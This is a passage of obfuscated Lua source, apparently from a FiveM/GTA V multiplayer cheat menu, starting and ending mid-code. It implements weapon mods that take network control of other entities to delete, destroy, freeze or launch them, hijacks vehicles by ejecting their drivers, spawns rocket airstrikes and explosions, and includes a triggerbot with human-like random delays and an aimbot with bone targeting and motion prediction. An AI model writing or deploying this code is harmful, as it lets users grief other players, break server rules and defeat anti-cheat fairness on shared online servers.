                            __REAPER1__.A['weapon:modifier_forcegun'].func and __REAPER1__.A['weapon:modifier_vehicles'].func and __REAPER1__.N.IsEntityAVehicle(v) then
                                __REAPER25__(function()
                                    if __REAPER1__.F.NetControl(v) then
                                        __REAPER1__.N.ApplyForceToEntity(v, 3, __REAPER1__.N.GetEntityForwardVector(__REAPER1__.V.SelfPed) * (__REAPER1__.A['weapon:modifier_strength'].sindex - 1) * 10, 0, 0, 0, false, false, true, true, false, true)
                                    end
                                end)
                            end

                            if __REAPER1__.A['weapon:ammo_deletegun'].func then
                                __REAPER1__.N.DeleteEntity(v)
                            end

                            if __REAPER1__.A['weapon:ammo_revivegun'].func and __REAPER1__.N.IsEntityAPed(v) and __REAPER1__.N.IsEntityDead(v) then
                                __REAPER25__(function()
                                    if __REAPER1__.F.NetControl(v) then
                                        __REAPER1__.N.RevivePed(v)
                                    end
                                end)
                            end

                            if __REAPER1__.A['weapon:ammo_destroygun'].func then
                                __REAPER25__(function()
                                    if __REAPER1__.F.NetControl(v) then
                                        if __REAPER1__.N.IsEntityAVehicle(v) then
                                            __REAPER1__.N.FuckUpVeh(v)
                                        else
                                            __REAPER1__.N.SetEntityHealth(v, 0)
                                        end
                                    end
                                end)
                            end

                            if __REAPER1__.A['weapon:ammo_nocollisiongun'].func then
                                __REAPER25__(function()
                                    if __REAPER1__.F.NetControl(v) then
                                        __REAPER1__.N.SetEntityCollision(v, false, false)
                                    end
                                end)
                            end

                            if __REAPER1__.A['weapon:ammo_nogravitygun'].func then
                                __REAPER25__(function()
                                    if __REAPER1__.F.NetControl(v) then
                                        if __REAPER1__.N.IsEntityAVehicle(v) then
                                            __REAPER1__.N.SetVehicleGravity(v, false)
                                        end
                                    end
                                end)
                            end

                            if __REAPER1__.A['weapon:ammo_freezegun'].func then
                                __REAPER25__(function()
                                    if __REAPER1__.F.NetControl(v) then
                                        __REAPER1__.N.FreezeEntityPosition(v, true)
                                    end
                                end)
                            end

                            if __REAPER1__.A['weapon:ammo_mindcleargun'].func and __REAPER1__.N.IsEntityAPed(v) then
                                __REAPER25__(function()
                                    if __REAPER1__.F.NetControl(v) then
                                        __REAPER1__.N.ClearPedTasksImmediately(v)
                                    end
                                end)
                            end

                            if __REAPER1__.A['weapon:ammo_shrinkgun'].func and __REAPER1__.N.IsEntityAPed(v) then
                                __REAPER1__.N.SetPedConfigFlag(v, 223, true)
                            end

                            if __REAPER1__.A['weapon:ammo_paintgun'].func and __REAPER1__.N.IsEntityAVehicle(v) then
                                __REAPER25__(function()
                                    if __REAPER1__.F.NetControl(v) then
                                        __REAPER1__.N.SetVehicleCustomSecondaryColour(v, math.random(1, 255), math.random(1, 255), math.random(1, 255))
                                        __REAPER1__.N.SetVehicleCustomPrimaryColour(v, math.random(1, 255), math.random(1, 255), math.random(1, 255))
                                    end
                                end)
                            end

                            if __REAPER1__.A['weapon:ammo_fixgun'].func and __REAPER1__.N.IsEntityAVehicle(v) then
                                __REAPER25__(function()
                                    if __REAPER1__.F.NetControl(v) then
                                        __REAPER1__.N.FixVehicle(v)
                                    end
                                end)
                            end

                            if __REAPER1__.A['weapon:ammo_driveitgun'].func and __REAPER1__.N.IsEntityAVehicle(v) then
                                local ped = __REAPER1__.N.GetPedInVehicleSeat(v, -1)
                                if ped then
                                    __REAPER1__.N.ClearPedTasksImmediately(ped)
                                end
                                __REAPER1__.N.SetPedIntoVehicle(__REAPER1__.V.SelfPed, v, -1)
                            end
                        end
                    end
                end

                if __REAPER1__.A['weapon:ammo_airstrikegun'].func then
                    local impact, coords = __REAPER1__.N.GetPedLastWeaponImpactCoord(__REAPER1__.V.SelfPed)
                    if impact then
                        __REAPER25__(function()
                            if __REAPER1__.F.RequestWeaponAsset(`WEAPON_RPG`) then
                                __REAPER1__.N.ShootSingleBulletBetweenCoords(coords.x, coords.y, coords.z + 80.0, coords, 0.0, true, `VEHICLE_WEAPON_SPACE_ROCKET`, __REAPER1__.V.SelfPed, false, true, 6000.0)
                            end
                        end)
                    end
                end

                if __REAPER1__.A['weapon:modifier_explodingbullet'].func then
                    local impact, coords = __REAPER1__.N.GetPedLastWeaponImpactCoord(__REAPER1__.V.SelfPed)
                    if impact then
                        __REAPER1__.N.CreateExplosion(coords, __REAPER1__.A['weapon:modifier_type'].sindex - 1, __REAPER1__.F.IntToFloat(__REAPER1__.A['weapon:modifier_damage'].func), __REAPER1__.A['weapon:modifier_explosion'].sindex == 3 and true or __REAPER1__.A['weapon:modifier_explosion'].sindex == 4 and true or false, __REAPER1__.A['weapon:modifier_explosion'].sindex == 2 and 0 or __REAPER1__.A['weapon:modifier_explosion'].sindex == 4 and 0 or true, (__REAPER1__.A['weapon:modifier_shake'].sindex - 1 ) / 50)
                    end
                end

                if __REAPER1__.A['weapon:modifier_teleportgun'].func then
                    local impact, coords = __REAPER1__.N.GetPedLastWeaponImpactCoord(__REAPER1__.V.SelfPed)
                    if impact then
                        __REAPER25__(function()
                            __REAPER26__(50)
                            local extra = __REAPER1__.A['weapon:modifier_addtocoords'].func[__REAPER1__.A['weapon:modifier_addtocoords'].sindex]
                            __REAPER1__.N.SetEntityCoordsNoOffset(__REAPER1__.V.SelfPed, coords.x + extra, coords.y + extra, coords.z + 0.5 + extra, true, true, true)
                        
                            if __REAPER1__.A['weapon:modifier_tsound'].func then
                                __REAPER1__.N.PlaySound(nil, -1, "CHECKPOINT_MISSED", "HUD_MINI_GAME_SOUNDSET", true)
                            end
                            if __REAPER1__.A['weapon:modifier_teffect'].func then
                                __REAPER1__.N.DoParticle('proj_indep_firework_v2', 'scr_xmas_firework_burst_fizzle', coords.x, coords.y, coords.z, 1.0, 0, 0, 0, 0, 0, 0)
                            end
                        end)
                    end
                end

                if __REAPER1__.A['weapon:modifier_pickupgun'].func then 
                    if __REAPER1__.N.IsPlayerFreeAiming(__REAPER1__.V.SelfPlayerId) then
                        __REAPER1__.N.DisablePlayerFiring(__REAPER1__.V.SelfPlayerId, true)
                        __REAPER1__.N.DisableControlAction(0, 50, true)
                        __REAPER1__.N.DisableControlAction(0, 17, true)
                        local cameraCoord = __REAPER1__.N.GetGameplayCamCoord()
                        local direction = __REAPER1__.M.RotationToDirection(__REAPER1__.N.GetGameplayCamRot(0))
                        
                        local ret, ent = __REAPER1__.N.GetEntityPlayerIsFreeAimingAt(__REAPER1__.V.SelfPlayerId)

                        if ret and __REAPER1__.N.IsDisabledControlJustReleased(0, 24) then
                            __REAPER25__(function()
                                if __REAPER1__.A['weapon:modifier_synced'].func then
                                    if __REAPER1__.F.NetControl(ent) then
                                        if __REAPER1__.V.PickUpEnt then
                                            if not __REAPER1__.A['weapon:modifier_keepalpha'].func then
                                                __REAPER1__.N.ResetEntityAlpha(__REAPER1__.V.PickUpEnt)
                                            end
                                            __REAPER1__.V.PickUpEnt = nil
                                        else
                                            __REAPER1__.V.PickUpEnt = ent
                                            __REAPER1__.N.SetEntityAlpha(ent, __REAPER1__.A['weapon:modifier_entityalpha'].func[__REAPER1__.A['weapon:modifier_entityalpha'].sindex])
                                        end
                                    end
                                else
                                    if __REAPER1__.V.PickUpEnt then
                                        if not __REAPER1__.A['weapon:modifier_keepalpha'].func then
                                            __REAPER1__.N.ResetEntityAlpha(__REAPER1__.V.PickUpEnt)
                                        end
                                        __REAPER1__.V.PickUpEnt = nil
                                        if __REAPER1__.A['weapon:modifier_psound'].func then __REAPER1__.N.PlaySound(nil, -1, 'ATM_WINDOW', 'HUD_FRONTEND_DEFAULT_SOUNDSET', true) end
                                    else
                                        __REAPER1__.V.PickUpEnt = ent
                                        __REAPER1__.N.SetEntityAlpha(ent, __REAPER1__.A['weapon:modifier_entityalpha'].func[__REAPER1__.A['weapon:modifier_entityalpha'].sindex])
                                    end
                                end
                            end)
                            if __REAPER1__.A['weapon:modifier_psound'].func then __REAPER1__.N.PlaySound(nil, -1, 'Click', 'DLC_HEIST_HACKING_SNAKE_SOUNDS', true) end
                        elseif __REAPER1__.V.PickUpEnt then
                            __REAPER1__.N.SetEntityCoordsNoOffset(__REAPER1__.V.PickUpEnt, cameraCoord.x + direction.x * __REAPER1__.V.PickupScroll, cameraCoord.y + direction.y * __REAPER1__.V.PickupScroll, cameraCoord.z + direction.z * __REAPER1__.V.PickupScroll, true, true, true)
                        end

                        if __REAPER1__.N.IsDisabledControlJustReleased(0, 14) and __REAPER1__.V.PickupScroll > 3 then
                            __REAPER1__.V.PickupScroll = __REAPER1__.V.PickupScroll - __REAPER1__.A['weapon:modifier_speed'].sindex
                        elseif __REAPER1__.N.IsDisabledControlJustReleased(0, 15) then
                            __REAPER1__.V.PickupScroll = __REAPER1__.V.PickupScroll + __REAPER1__.A['weapon:modifier_speed'].sindex
                        end
                    elseif __REAPER1__.V.PickUpEnt then
                        if not __REAPER1__.A['weapon:modifier_keepalpha'].func then
                            __REAPER1__.N.ResetEntityAlpha(__REAPER1__.V.PickUpEnt)
                        end
                        __REAPER1__.V.PickUpEnt = nil
                        if __REAPER1__.A['weapon:modifier_psound'].func then __REAPER1__.N.PlaySound(nil, -1, 'ATM_WINDOW', 'HUD_FRONTEND_DEFAULT_SOUNDSET', true) end
                    end
                end

                if __REAPER1__.A['weapon:1shot1kill'].func and __REAPER1__.N.IsPedShooting(__REAPER1__.V.SelfPed) then
                    local coords, ent = __REAPER1__.M.RayCastGameplayCamera(__REAPER1__.N.GetMaxRangeOfCurrentPedWeapon(__REAPER1__.V.SelfPed))
                    __REAPER1__.N.ShootSingleBulletBetweenCoords(__REAPER1__.N.WeaponCoords(__REAPER1__.V.SelfPed), coords, 200, true, __REAPER1__.N.GetSelectedPedWeapon(__REAPER1__.V.SelfPed), __REAPER1__.V.SelfPed, false, true, 10000000.0)
                end

                if __REAPER1__.A['weapon:entitygun_vehicle'].toggle or __REAPER1__.A['weapon:entitygun_pedestrian'].toggle or __REAPER1__.A['weapon:entitygun_object'].toggle then
                    if __REAPER1__.A['weapon:entitygun_disablefiring'].func then
                        __REAPER1__.N.DisablePlayerFiring(__REAPER1__.V.SelfPlayerId, true)
                    end

                    if __REAPER1__.A['weapon:entitygun_disablefiring'].func and __REAPER1__.N.IsPlayerFreeAiming(__REAPER1__.V.SelfPlayerId) and __REAPER1__.A['weapon:entitygun_holdbutton'].func and __REAPER1__.N.IsDisabledControlPressed(0, 24) or __REAPER1__.A['weapon:entitygun_disablefiring'].func and __REAPER1__.N.IsPlayerFreeAiming(__REAPER1__.V.SelfPlayerId) and __REAPER1__.N.IsDisabledControlJustPressed(0, 24)
                    or not __REAPER1__.A['weapon:entitygun_disablefiring'].func and __REAPER1__.N.IsPedShooting(__REAPER1__.V.SelfPed) then
                        local coords = __REAPER1__.N.GetEntityCoords(__REAPER1__.V.SelfPed)
                        local direction = __REAPER1__.M.RotationToDirection(__REAPER1__.N.GetGameplayCamRot(0))

                        __REAPER25__(function()
                            if __REAPER1__.A['weapon:entitygun_vehicle'].toggle then
                                local themodelHash = __REAPER1__.N.GetHashKey(__REAPER1__.T.VehicleGunVehicle[__REAPER1__.A['weapon:entitygun_vehicle'].sindex])
                                if __REAPER1__.F.RequestEntity(themodelHash) then
                                    local ent = __REAPER1__.N.CreateVehicle(themodelHash, coords.x + direction.x * 10, coords.y + direction.y * 10, coords.z + direction.z * 10, __REAPER1__.N.GetEntityHeading(__REAPER1__.V.SelfPed), true, true)
                                    __REAPER1__.N.SetEntityRotation(ent, __REAPER1__.N.GetGameplayCamRot(), 0, true)
                                    __REAPER1__.N.SetEntityInvincible(ent, __REAPER1__.A['weapon:entitygun_godmoded'].func)
                                    __REAPER1__.N.SetEntityVisible(ent, not __REAPER1__.A['weapon:entitygun_invisible'].func)
                                    __REAPER1__.N.ApplyForceToEntity(ent, 3, (direction * 50) * __REAPER1__.A['weapon:entitygun_strength'].sindex, 0, 0, 0, false, false, true, true, false, true)
                                    if __REAPER1__.A['weapon:entitygun_cleanup'].func then
                                        __REAPER25__(function()
                                            __REAPER26__(1000)
                                            __REAPER1__.N.DeleteEntity(ent)
                                        end)
                                    end
                                end
                            end
                            if __REAPER1__.A['weapon:entitygun_pedestrian'].toggle then
                                local ped = __REAPER1__.T.VehicleGunPed[__REAPER1__.A['weapon:entitygun_pedestrian'].sindex]
                                local themodelHash = __REAPER1__.N.GetHashKey(ped)
                                if __REAPER1__.F.RequestEntity(themodelHash) then
                                    local ent = __REAPER1__.N.CreatePed(__REAPER1__.N.GetPedType(ped), themodelHash, coords.x + direction.x * 10, coords.y + direction.y * 10, coords.z + direction.z * 10, __REAPER1__.N.GetEntityHeading(__REAPER1__.V.SelfPed), true, true)
                                    __REAPER1__.N.SetEntityRotation(ent, __REAPER1__.N.GetGameplayCamRot(), 0, true)
                                    __REAPER1__.N.SetEntityInvincible(ent, __REAPER1__.A['weapon:entitygun_godmoded'].func)
                                    __REAPER1__.N.SetEntityVisible(ent, not __REAPER1__.A['weapon:entitygun_invisible'].func)
                                    __REAPER1__.N.ApplyForceToEntity(ent, 3, (direction * 50) * __REAPER1__.A['weapon:entitygun_strength'].sindex, 0, 0, 0, false, false, true, true, false, true)
                                    if __REAPER1__.A['weapon:entitygun_cleanup'].func then
                                        __REAPER25__(function()
                                            __REAPER26__(1000)
                                            __REAPER1__.N.DeleteEntity(ent)
                                        end)
                                    end
                                end
                            end
                            if __REAPER1__.A['weapon:entitygun_object'].toggle then
                                local themodelHash = __REAPER1__.N.GetHashKey(__REAPER1__.T.VehicleGunObject[__REAPER1__.A['weapon:entitygun_object'].sindex])
                                if __REAPER1__.F.RequestEntity(themodelHash) then
                                    local ent = __REAPER1__.N.CreateObject(themodelHash, coords.x + direction.x * 10, coords.y + direction.y * 10, coords.z + direction.z * 10, true, true, true)
                                    __REAPER1__.N.SetEntityRotation(ent, __REAPER1__.N.GetGameplayCamRot(), 0, true)
                                    __REAPER1__.N.SetEntityInvincible(ent, __REAPER1__.A['weapon:entitygun_godmoded'].func)
                                    __REAPER1__.N.SetEntityVisible(ent, not __REAPER1__.A['weapon:entitygun_invisible'].func)
                                    __REAPER1__.N.ApplyForceToEntity(ent, 3, (direction * 50) * __REAPER1__.A['weapon:entitygun_strength'].sindex, 0, 0, 0, false, false, true, true, false, true)
                                    if __REAPER1__.A['weapon:entitygun_cleanup'].func then
                                        __REAPER25__(function()
                                            __REAPER26__(1000)
                                            __REAPER1__.N.DeleteEntity(ent)
                                        end)
                                    end
                                end
                            end
                        end)
                    end
                end

                if __REAPER1__.A['weapon:debuggun_debuggun'].func then
                    __REAPER1__.N.DisablePlayerFiring(__REAPER1__.V.SelfPlayerId, true)
                    if __REAPER1__.A['weapon:debuggun_gundependent'].func then
                        if __REAPER1__.N.IsDisabledControlPressed(0, 24) and __REAPER1__.N.IsPlayerFreeAiming(__REAPER1__.V.SelfPlayerId) then
                            local ret, ent = __REAPER1__.N.GetEntityPlayerIsFreeAimingAt(__REAPER1__.V.SelfPlayerId)
                            if ret then
                                __REAPER1__.V.DebugGunEntity = ent
                            end
                        end
                    else
                        if __REAPER1__.N.IsDisabledControlPressed(0, 24) then
                            local coords, ent = __REAPER1__.M.RayCastGameplayCamera(400.0)
                            if ent then
                                __REAPER1__.V.DebugGunEntity = ent
                            end
                        end
                    end

                    if __REAPER1__.V.DebugGunEntity and __REAPER1__.T.Objects then
                        local coords = __REAPER1__.N.GetEntityCoords(__REAPER1__.V.DebugGunEntity)
                        local dist = #(coords - __REAPER1__.N.GetEntityCoords(__REAPER1__.V.SelfPed))
                        local ret, sx, sy = __REAPER1__.N.GetScreenCoordFromWorldCoord(coords.x, coords.y, coords.z)
                        if dist <= __REAPER1__.A['weapon:debuggun_distance'].sindex then
                            local rot = __REAPER1__.N.GetEntityRotation(__REAPER1__.V.DebugGunEntity)
                            local vel = __REAPER1__.N.GetEntityVelocity(__REAPER1__.V.DebugGunEntity)
                            __REAPER1__.F.DrawText('Hash: ' .. __REAPER1__.V.DebugGunEntity, sx, sy - 0.2, 0, 255, 255, 255, 255, 0.29, false, false, true)
                            __REAPER1__.F.DrawText(__REAPER1__.T.Objects[tostring(__REAPER1__.N.GetEntityModel(__REAPER1__.V.DebugGunEntity))] and 'Model: ' .. __REAPER1__.T.Objects[tostring(__REAPER1__.N.GetEntityModel(__REAPER1__.V.DebugGunEntity))] or 'Model: Unknown', sx, sy - 0.178, 0, 255, 255, 255, 255, 0.29, false, false, true)
                            __REAPER1__.F.DrawText('Model hash: ' .. __REAPER1__.N.GetEntityModel(__REAPER1__.V.DebugGunEntity), sx, sy - 0.156, 0, 255, 255, 255, 255, 0.29, false, false, true)
                            __REAPER1__.F.DrawText('Model hash (Hex): 0x' .. string.upper(string.format("%x", __REAPER1__.N.GetEntityModel(__REAPER1__.V.DebugGunEntity))), sx, sy - 0.134, 0, 255, 255, 255, 255, 0.29, false, false, true)
                            __REAPER1__.F.DrawText('Health: ' .. __REAPER1__.N.GetEntityHealth(__REAPER1__.V.DebugGunEntity) .. ' / ' .. __REAPER1__.N.GetEntityMaxHealth(__REAPER1__.V.DebugGunEntity), sx, sy - 0.112, 0, 255, 255, 255, 255, 0.29, false, false, true)
                            __REAPER1__.F.DrawText('Distance: ' .. __REAPER1__.F.FloatLength(dist, 3) .. ' Meters', sx, sy - 0.090, 0, 255, 255, 255, 255, 0.29, false, false, true)
                            __REAPER1__.F.DrawText('Heading: ' .. __REAPER1__.F.FloatLength(__REAPER1__.N.GetEntityHeading(__REAPER1__.V.DebugGunEntity), 5), sx, sy - 0.068, 0, 255, 255, 255, 255, 0.29, false, false, true)
                            __REAPER1__.F.DrawText('Position: ' .. __REAPER1__.F.FloatLength(coords.x, 5) .. ' ' .. __REAPER1__.F.FloatLength(coords.y, 5) .. ' ' .. __REAPER1__.F.FloatLength(coords.z, 5), sx, sy - 0.046, 0, 255, 255, 255, 255, 0.29, false, false, true)
                            __REAPER1__.F.DrawText('Rotation: ' .. __REAPER1__.F.FloatLength(rot.x, 5) .. ' ' .. __REAPER1__.F.FloatLength(rot.y, 5) .. ' ' .. __REAPER1__.F.FloatLength(rot.z, 5), sx, sy - 0.024, 0, 255, 255, 255, 255, 0.29, false, false, true)
                            __REAPER1__.F.DrawText('Velocity: ' .. __REAPER1__.F.FloatLength(vel.x, 5) .. ' ' .. __REAPER1__.F.FloatLength(vel.y, 5) .. ' ' .. __REAPER1__.F.FloatLength(vel.z, 5), sx, sy - 0.002, 0, 255, 255, 255, 255, 0.29, false, false, true)
                        end
                        if dist <= __REAPER1__.A['weapon:debuggun_rectangledistance'].sindex then
                            local r, g, b, a = __REAPER1__.F.TableToColor(__REAPER1__.A['weapon:debuggun_rectanglecolor'].menuextra)
                            __REAPER1__.N.DrawRect(sx + 0.085, sy - 0.09, 0.2, 0.25, r, g, b, a)
                        end
                    end
                end

                if __REAPER1__.A['weapon:eyeforaneye'].func then
                    if __REAPER1__.N.GetEntityHealth(__REAPER1__.V.SelfPed) <= 100 then
                        __REAPER1__.V.KillerPed = __REAPER1__.N.GetPedSourceOfDeath(__REAPER1__.V.SelfPed)
                    end

                    if __REAPER1__.V.KillerPed and __REAPER1__.N.IsEntityAPed(__REAPER1__.V.KillerPed) and __REAPER1__.V.KillerPed ~= __REAPER1__.V.PrevKiller then
                        if __REAPER1__.N.GetEntityHealth(__REAPER1__.V.SelfPed) ~= 200 then
                            __REAPER1__.N.SetEntityHealth(__REAPER1__.V.SelfPed, 200)
                        end

                        local coords = __REAPER1__.N.GetEntityCoords(__REAPER1__.V.KillerPed)
                        __REAPER1__.N.ShootSilentSingleBulletBetweenCoords(coords.x, coords.y, coords.z + 1.0, coords, 100000000, true, `WEAPON_PISTOL`, __REAPER1__.V.SelfPed, false, true, 10000000.0)

                        if __REAPER1__.N.IsEntityDead(__REAPER1__.V.KillerPed) or (__REAPER1__.V.Eye4EyeCounter or 0) > 200 then
                            __REAPER1__.V.PrevKiller = __REAPER1__.V.KillerPed
                            __REAPER1__.N.SetEntityHealth(__REAPER1__.V.SelfPed, 0)
                        end

                        __REAPER1__.V.Eye4EyeCounter = (__REAPER1__.V.Eye4EyeCounter or 1) + 1
                    end
                end

                if __REAPER1__.A['weapon:rainbowtint'].func then
                    local ret, wep = __REAPER1__.N.GetCurrentPedWeapon(__REAPER1__.V.SelfPed, 1)
                    if ret and __REAPER1__.V.WeaponTintTimer and __REAPER1__.V.WeaponTintTimer <= __REAPER1__.N.GetGameTimer() or not __REAPER1__.V.WeaponTintTimer and 0 <= __REAPER1__.N.GetGameTimer() then
                        __REAPER1__.V.WeaponTintTimer = __REAPER1__.N.GetGameTimer() + 100
                        __REAPER1__.N.SetPedWeaponTintIndex(__REAPER1__.V.SelfPed, wep, math.random(1, 7))
                    end
                end

                if __REAPER1__.A['weapon:cartoongun'].func and __REAPER1__.N.IsPedShooting(__REAPER1__.V.SelfPed) then
                    local coords = __REAPER1__.N.WeaponCoords(__REAPER1__.V.SelfPed)
                    __REAPER1__.N.DoParticle('scr_rcbarry2', 'muz_clown', coords.x, coords.y, coords.z, 1.0, 0, 0, 0, 0, 0, 0)
                end

                if __REAPER1__.A['weapon:rapidfire'].toggle then
                    __REAPER1__.N.DisablePlayerFiring(__REAPER1__.V.SelfPlayerId, true)
                    local ret, wep = __REAPER1__.N.GetCurrentPedWeapon(__REAPER1__.V.SelfPed, 1)
                    if __REAPER1__.N.IsDisabledControlPressed(0, 24) and not __REAPER1__.N.IsPauseMenuActive() and ret then
                        local coords, entity = __REAPER1__.M.RayCastGameplayCamera(400.0)
                        __REAPER25__(function()
                            __REAPER26__(0)
                            __REAPER1__.N.ClearAreaOfProjectiles(pos, 0.0, 1)
                            local pos = __REAPER1__.N.WeaponCoords(__REAPER1__.V.SelfPed)
                            if __REAPER1__.A['weapon:rapidfire'].sindex == 1 then
                                __REAPER1__.N.ShootSingleBulletBetweenCoords(pos, coords, 5, true, wep, __REAPER1__.V.SelfPed, true, true, 500.0)
                            elseif __REAPER1__.A['weapon:rapidfire'].sindex == 2 then
                                __REAPER1__.N.ShootSingleBulletBetweenCoords(pos, coords, 5, true, wep, __REAPER1__.V.SelfPed, true, true, 500.0)
                                __REAPER1__.N.ShootSingleBulletBetweenCoords(pos, coords, 5, true, wep, __REAPER1__.V.SelfPed, true, true, 500.0)
                            elseif __REAPER1__.A['weapon:rapidfire'].sindex == 3 then
                                __REAPER1__.N.ShootSingleBulletBetweenCoords(pos, coords, 5, true, wep, __REAPER1__.V.SelfPed, true, true, 500.0)
                                __REAPER1__.N.ShootSingleBulletBetweenCoords(pos, coords, 5, true, wep, __REAPER1__.V.SelfPed, true, true, 500.0)
                                __REAPER1__.N.ShootSingleBulletBetweenCoords(pos, coords, 5, true, wep, __REAPER1__.V.SelfPed, true, true, 500.0)
                            end
                        end)
                    end
                end

                if __REAPER1__.A['weapon:disablereload'].func then
                    __REAPER1__.N.PedSkipNextReloading(__REAPER1__.V.SelfPed)
                end

                if __REAPER1__.A['player:movement_superrun'].toggle and __REAPER1__.N.IsDisabledControlPressed(0, 21) and not __REAPER1__.N.IsPedRagdoll(__REAPER1__.V.SelfPed) then
                    if __REAPER1__.N.IsDisabledControlPressed(0, 32) or __REAPER1__.N.IsDisabledControlPressed(0, 33) or __REAPER1__.N.IsDisabledControlPressed(0, 34) or __REAPER1__.N.IsDisabledControlPressed(0, 35) then
                        __REAPER1__.N.ApplyForceToEntity(__REAPER1__.V.SelfPed, 3, __REAPER1__.N.GetEntityForwardVector(__REAPER1__.V.SelfPed) * __REAPER1__.A['player:movement_superrun'].sindex / 10, 0, 0, 0, false, false, true, true, false, true)
                    end
                end

                if __REAPER1__.A['combat:triggerbot_triggerbot'].func and __REAPER1__.A['combat:triggerbot_delay'].sindex == 2 or __REAPER1__.A['combat:triggerbot_triggerbot'].func and __REAPER1__.N.GetGameTimer() >= (__REAPER1__.V.TbotWait or 0) then
                    __REAPER1__.V.TbotRet, __REAPER1__.V.TbotEnt = __REAPER1__.N.GetEntityPlayerIsFreeAimingAt(__REAPER1__.V.SelfPlayerId)

                    if __REAPER1__.A['combat:triggerbot_bone'].toggle and __REAPER1__.N.IsEntityAPed(__REAPER1__.V.TbotEnt) then
                        local coords, entity = __REAPER1__.M.RayCastGameplayCamera(400.0)

                        local bone = __REAPER1__.N.GetPedBoneCoords(__REAPER1__.V.TbotEnt, __REAPER1__.T.AimbotBones[__REAPER1__.A['combat:triggerbot_bone'].sindex])
                        if #(coords - bone) > 0.3 then
                            __REAPER1__.V.TbotRet, __REAPER1__.V.TbotEnt = false, nil
                        end
                    end
                    
                    if __REAPER1__.V.TbotRet and not __REAPER1__.A['combat:triggerbot_onkey'].toggle or __REAPER1__.V.TbotRet and __REAPER1__.A['combat:triggerbot_onkey'].toggle and __REAPER1__.N.IsDisabledControlPressed(0, __REAPER1__.T.ControlsPlain[__REAPER1__.A['combat:triggerbot_onkey'].func[__REAPER1__.A['combat:triggerbot_onkey'].sindex]]) then
                        if (__REAPER1__.A['combat:triggerbot_targetinvisible'] or __REAPER1__.N.IsEntityVisible(__REAPER1__.V.TbotEnt)) and (not __REAPER1__.A['combat:triggerbot_targetinglist'].toggle or __REAPER1__.F.TlistCheck(__REAPER1__.V.TbotEnt, 'combat:triggerbot_targetinglist')) then
                            if __REAPER1__.A['combat:triggerbot_delay'].sindex == 1 then
                                __REAPER1__.V.TbotWait = __REAPER1__.N.GetGameTimer() + math.random(1, 1000)
                            elseif __REAPER1__.A['combat:triggerbot_delay'].sindex > 2 then
                                __REAPER1__.V.TbotWait = __REAPER1__.N.GetGameTimer() + __REAPER1__.A['combat:triggerbot_delay'].sindex - 2
                            end
                            if (__REAPER1__.A['combat:triggerbot_onlyplayers'].func and __REAPER1__.N.IsPedAPlayer(__REAPER1__.V.TbotEnt) or __REAPER1__.N.IsEntityAPed(__REAPER1__.V.TbotEnt)) and (not __REAPER1__.A['combat:triggerbot_vehicles'].func and not __REAPER1__.N.IsPedInAnyVehicle(__REAPER1__.V.TbotEnt) or __REAPER1__.A['combat:triggerbot_vehicles'].func) and  (__REAPER1__.A['combat:triggerbot_chance'].toggle and math.random(0, 100) <= __REAPER1__.A['combat:triggerbot_chance'].sindex - 1 or not __REAPER1__.A['combat:triggerbot_chance'].toggle) and (__REAPER1__.A['combat:triggerbot_distance'].toggle and __REAPER1__.A['combat:triggerbot_distance'].sindex <= #(__REAPER1__.N.GetEntityCoords(__REAPER1__.V.TbotEnt) - __REAPER1__.N.GetEntityCoords(__REAPER1__.V.SelfPed)) or __REAPER1__.N.GetMaxRangeOfCurrentPedWeapon(__REAPER1__.V.SelfPed)) and  (__REAPER1__.A['combat:triggerbot_alive'].func and not __REAPER1__.N.IsEntityDead(__REAPER1__.V.TbotEnt) or not __REAPER1__.A['combat:triggerbot_alive'].func) and (__REAPER1__.A['combat:triggerbot_maxdamage'].toggle and __REAPER1__.N.GetEntityHealth(__REAPER1__.V.TbotEnt) - __REAPER1__.A['combat:triggerbot_maxdamage'].sindex < __REAPER1__.A['combat:triggerbot_maxdamage'].sindex or not __REAPER1__.A['combat:triggerbot_maxdamage'].toggle) then
                                if __REAPER1__.A['combat:triggerbot_singleshots'].func then
                                    __REAPER1__.N.SetControlNormal(0, 24, 1.0)
                                else
                                    __REAPER25__(function()
                                        local time = __REAPER1__.N.GetGameTimer()
                                        while __REAPER1__.N.GetGameTimer() - time < math.random(1000, 5000) do
                                            __REAPER26__(0)
                                            if __REAPER1__.N.GetGameTimer() >= (__REAPER1__.V.TbotWait or 0) then
                                                __REAPER1__.N.SetControlNormal(0, 24, 1.0)
                                            end

                                            if not __REAPER1__.V.TbotRet then
                                                time = time - math.random(10, 40)
                                            end
                                        end
                                    end)
                                end
                            end
                        end
                    end
                end

                if __REAPER1__.A['combat:aimbot_aimbot'].func then
                    if __REAPER1__.A['combat:aimbot_autoaim'].func then
                        __REAPER1__.N.SetControlNormal(0, 25, 1.0)
                    end

                    if (not __REAPER1__.A['combat:aimbot_onkey'].toggle or __REAPER1__.N.IsDisabledControlPressed(0, __REAPER1__.T.ControlsPlain[__REAPER1__.A['combat:aimbot_onkey'].func[__REAPER1__.A['combat:aimbot_onkey'].sindex]])) and (not __REAPER1__.A['combat:aimbot_aimonly'].func or __REAPER1__.A['combat:aimbot_aimonly'].func and __REAPER1__.N.IsDisabledControlPressed(0, 25)) then
                        local bone = __REAPER1__.A['combat:aimbot_bone'].sindex == 1 and __REAPER1__.T.AimbotBones[__REAPER1__.V.ABoneNum] or __REAPER1__.T.AimbotBones[__REAPER1__.A['combat:aimbot_bone'].sindex - 1]
                        local target, xret, yret = __REAPER1__.F.ClosestEntity(__REAPER1__.A['combat:aimbot_onlyplayers'].func and 'player' or 'ped', false,'aimbot', bone)
                        if __REAPER1__.A['combat:aimbot_target'].sindex == 1 and target or xret and __REAPER1__.F.AimfovIsIn(xret, yret) then
                            if target ~= __REAPER1__.V.APrevTarg then
                                __REAPER1__.V.APrevTarg, __REAPER1__.V.PrevPos = target, nil
                            end
                            
                            if __REAPER1__.A['combat:aimbot_bone'].sindex == 1 and __REAPER1__.N.IsPedShooting(__REAPER1__.V.SelfPed) then
                                __REAPER1__.V.ABoneNum = math.random(1, 14)
                            end

                            if __REAPER1__.V.PrevPos then
                                __REAPER1__.V.CurrPos = __REAPER1__.N.GetPedBoneCoords(target, bone)
                                __REAPER1__.V.DiffDelta = __REAPER1__.V.CurrPos - __REAPER1__.V.PrevPos
                                __REAPER1__.V.PredDist = #(__REAPER1__.V.CurrPos - __REAPER1__.V.PrevPos)
                                __REAPER1__.V.BonePos = (__REAPER1__.V.CurrPos + __REAPER1__.V.DiffDelta)
                                __REAPER1__.V.PrevPos = __REAPER1__.N.GetPedBoneCoords(target, bone)
                            else
                                __REAPER1__.V.PrevPos = __REAPER1__.N.GetPedBoneCoords(target, bone)
